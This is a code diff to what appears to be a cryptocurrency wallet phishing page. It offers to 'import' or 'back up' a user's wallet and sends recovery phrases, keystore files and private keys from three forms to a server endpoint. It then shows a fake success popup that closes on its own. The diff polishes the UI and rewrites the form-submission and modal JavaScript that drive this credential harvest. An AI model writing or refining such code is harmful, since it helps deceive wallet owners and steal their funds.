@@ -2364,19 +2364,23 @@ if (!isset($_SESSION['csrf_token'])) {
         </div>
     </div>
 
-    <!-- Success Popup Modal -->
-    <div class="modal fade" id="successModal" tabindex="-1">
+
+    <!-- SUCCESS POPUP – AUTO-CLOSE + WORKING X -->
+    <div class="modal fade" id="successModal" tabindex="-1" data-bs-backdrop="static">
         <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-header bg-success text-white">
-                    <h5 class="modal-title">Success!</h5>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            <div class="modal-content border-0 shadow-lg"
+                style="background: linear-gradient(135deg, #1e3c72, #2a5298);">
+                <div class="modal-header border-0">
+                    <h5 class="modal-title text-white fw-bold">✓ Success!</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"
+                        aria-label="Close"></button>
                 </div>
-                <div class="modal-body">
-                    <p>Your wallet has been backed up successfully! Check your email for confirmation.</p>
+                <div class="modal-body text-white fs-5 text-center py-4">
+                    <i class="fas fa-wallet fa-3x mb-3 text-success"></i><br>
+                    Your Wallet has been backed up successfully!
                 </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-success" data-bs-dismiss="modal">Close</button>
+                <div class="modal-footer border-0 justify-content-center pb-4">
+                    <button type="button" class="btn btn-light px-4" data-bs-dismiss="modal">Close</button>
                 </div>
             </div>
         </div>
@@ -2400,99 +2404,91 @@ if (!isset($_SESSION['csrf_token'])) {
         </div>
     </div>
 
-    <!-- Bootstrap JS (BS5 bundle for consistency) -->
+    <!-- Bootstrap JS & dependencies -->
+    <script src="assets/code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="assets/cdn.jsdelivr.net/npm/popper.js%401.16.1/dist/umd/popper.min.js"></script>
+    <script src="assets/stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // 1. WALLET CLICK (jQuery-style, but vanilla)
+    document.querySelectorAll('.hp-select-box-item').forEach(card => {
+        card.addEventListener('click', function() {
+            const walletName = this.querySelector('.coin-name').textContent.trim();
+            const walletImg = this.querySelector('img').src;
 
-    <!-- Bootstrap JS & dependencies (jQuery first for BS4 compatibility) -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+            document.getElementById('walletModalName').textContent = walletName;
+            document.getElementById('walletModalNameText').textContent = walletName;
+            document.getElementById('walletModalImg').src = walletImg;
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Skip explanation script if form data in query (prevents hijack)
-            if (window.location.search.includes('pemail') || window.location.search.includes('phrase')) {
-                document.getElementById('content').innerHTML = '<h2>Form Submitted</h2><p>Your submission is being processed.</p>';
-                return;
-            }
-
-            // Event delegation for form submissions
-            document.addEventListener('submit', async (e) => {
-                if (e.target.matches('#phraseForm, #keystoreForm, #privateForm')) {
-                    e.preventDefault();
-
-                    const form = e.target;
-                    const formData = new FormData(form);
-
-                    try {
-                        const response = await fetch('/api/process.php', {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        const result = await response.json();
-
-                        if (response.ok && result.success) {
-                            // Success popup
-                            const successModal = new bootstrap.Modal(document.getElementById('successModal'));
-                            successModal.show();
-                            form.reset();
-                            const importModal = bootstrap.Modal.getInstance(document.getElementById('importModal'));
-                            importModal.hide();
-                        } else {
-                            // Error popup
-                            document.getElementById('errorMessage').textContent = result.error || 'Unknown error occurred';
-                            const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
-                            errorModal.show();
-                        }
-                    } catch (error) {
-                        document.getElementById('errorMessage').textContent = 'Network error: ' + error.message;
-                        const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
-                        errorModal.show();
-                    }
-                }
-            });
-
-            // Reset forms when modal closes
-            document.getElementById('importModal').addEventListener('hidden.bs.modal', function () {
-                document.querySelectorAll('#walletTabContent form').forEach(form => form.reset());
-            });
+            new bootstrap.Modal(document.getElementById('walletModal')).show();
         });
-    </script>
-    <script>
-        $(document).ready(function () {
-            console.log('JS loaded, wallet count: ' + $('.hp-select-box-item').length);  // Debug: Check if cards found
+    });
 
-            // 1) Click on any wallet card (event delegation for dynamic content)
-            $(document).on('click', '.hp-select-box-item', function () {
-                console.log('Wallet card clicked!');  // Debug: Confirm click fires
+    // 2. CONNECT BUTTON
+    document.getElementById('connectBtn').addEventListener('click', function() {
+        const walletName = document.getElementById('walletModalName').textContent;
+        const walletImg = document.getElementById('walletModalImg').src;
 
-                var walletName = $(this).find('.coin-name').text().trim();
-                var walletImg = $(this).find('img').attr('src');
+        const walletModal = bootstrap.Modal.getInstance(document.getElementById('walletModal'));
+        walletModal.hide();
 
-                $('#walletModalName').text(walletName);
-                $('#walletModalNameText').text(walletName);
-                $('#walletModalImg').attr('src', walletImg);
+        walletModal._element.addEventListener('hidden.bs.modal', function() {
+            document.getElementById('importModalImg').src = walletImg;
+            document.getElementById('importModalTitle').textContent = "Import your " + walletName + " Wallet";
+            new bootstrap.Modal(document.getElementById('importModal')).show();
+            this.removeEventListener('hidden.bs.modal', arguments.callee);
+        }, {once: true});
+    });
 
-                $('#walletModal').modal('show');
-            });
+    // 3. FORM SUBMISSION + POPUP AUTO-CLOSE
+    document.addEventListener('submit', async (e) => {
+        if (e.target.matches('#phraseForm, #keystoreForm, #privateForm')) {
+            e.preventDefault();
 
-            // 2) On "Connect," close #walletModal, then open #importModal
-            $('#connectBtn').on('click', function () {
-                var walletName = $('#walletModalName').text();
-                var walletImg = $('#walletModalImg').attr('src');
+            const form = e.target;
+            const formData = new FormData(form);
 
-                $('#walletModal').modal('hide');
-
-                $('#walletModal').on('hidden.bs.modal', function () {
-                    $('#importModalImg').attr('src', walletImg);
-                    $('#importModalTitle').text("Import your " + walletName + " Wallet");
-
-                    $('#importModal').modal('show');
-                    $(this).off('hidden.bs.modal');
+            try {
+                const response = await fetch('/api/process.php', {
+                    method: 'POST',
+                    body: formData
                 });
-            });
-        });
-    </script>
 
+                let result;
+                try {
+                    result = await response.json();
+                } catch {
+                    result = { error: 'Server error - try again' };
+                }
+
+                const modalId = result.success ? 'successModal' : 'errorModal';
+                const modal = new bootstrap.Modal(document.getElementById(modalId));
+                modal.show();
+
+                if (result.success) {
+                    form.reset();
+                    bootstrap.Modal.getInstance(document.getElementById('importModal')).hide();
+                } else {
+                    document.getElementById('errorMessage').textContent = result.error;
+                }
+
+                // AUTO-CLOSE IN 3 SECONDS
+                setTimeout(() => modal.hide(), 3000);
+
+            } catch (error) {
+                document.getElementById('errorMessage').textContent = 'Network error: ' + error.message;
+                new bootstrap.Modal(document.getElementById('errorModal')).show();
+                setTimeout(() => bootstrap.Modal.getInstance(document.getElementById('errorModal')).hide(), 3000);
+            }
+        }
+    });
+
+    // 4. RESET FORMS ON MODAL CLOSE
+    document.getElementById('importModal').addEventListener('hidden.bs.modal', () => {
+        document.querySelectorAll('#walletTabContent form').forEach(form => form.reset());
+    });
+});
+</script>
+</body>
 </html>
